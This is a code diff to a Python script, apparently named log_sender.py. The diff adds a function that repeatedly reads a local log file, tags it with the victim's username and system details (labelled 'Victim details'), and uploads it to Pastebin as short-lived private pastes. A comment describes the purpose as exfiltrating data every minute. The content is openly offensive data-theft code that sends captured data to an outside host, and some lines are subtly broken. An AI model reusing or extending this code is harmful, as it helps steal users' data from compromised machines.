@@ -7,9 +7,13 @@ Yonatan Orozko & Ilona Geftner
 import sys, getopt
 from dotenv import load_dotenv
 from os import environ as en
+from os.path import exists
+from os import uname
 import getpass
 import pastebin
-
+import datetime;
+from time import sleep
+import json  
 
 
 # Define API & connect to pastebin
@@ -34,18 +38,42 @@ def get_pastebin_api():
     return(api)
             
 #Check fill buffer to send.
-#def fill_buffer():
+def fill_buffer_upload(myInode, uploadInterval):
+    ct = datetime.datetime.now()
+    bufferToUp = {getpass.getuser():("Victim details: {}".format(uname()))}
+    try:
+        api = get_pastebin_api()
+    except Exception as e:
+        print(e)
+    try:
+        f = open(myInode)
+            
+    except Exception as e:
+        print(e)
+    while exists(myInode):
+        sleep(uploadInterval)
+        bufferToUp[ct]= f.read()
+        if(sys.getsizeof(bufferToUp)>1000):
+            data = json.dumps(bufferToUp)
+            result = api.paste(data, guest=True, name="Logs for: {}".format(getpass.getuser()), format='json', private='1', expire='10M')
+            if 'Bad API request' not in result:
+                print('[+] - PasteBin URL: ' + result)
+                bufferToUp.clear()
+            else:
+                raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))
+                
+            
+        
+        
+    f.close
+    # Create a Paste\
+    
+        
     
 #Exfiltrade data to Pastebin every min
 
 
-# Create a Paste
-# data   = open(__file__).read()
-# result = api.paste(data, guest=True, name='Example Script', format='Python', private='1', expire='10M')
-# if 'Bad API request' not in result:
-# 	print('[+] - PasteBin URL: ' + result)
-# else:
-# 	raise SystemExit('[!] - Failed to create paste! ({0})'.format(api_user_key.split(', ')[1]))
+
 
 def main():
     time_to_upload = None
@@ -55,7 +83,7 @@ def main():
         opts, args = getopt.getopt(argv, "p:t:f:")
      
     except:
-        print('''This script will upload to pastebin data every 30 when data is bigger than 2000bytes''')
+        print('''This script will upload to pastebin data every 30 when data is bigger than 1000bytes evey -t seconds''')
     
     for opt, arg in opts:
         if opt in ['-f']:
@@ -65,8 +93,8 @@ def main():
         else:
             print(" USE: python log_sender.py -f <file_name> -t <time to upload>")
     try:
-        paste_api = get_pastebin_api()
-        print(paste_api)
+        fill_buffer_upload(file_inode,time_to_upload)
+        
     except Exception as e:
         print(e)
     
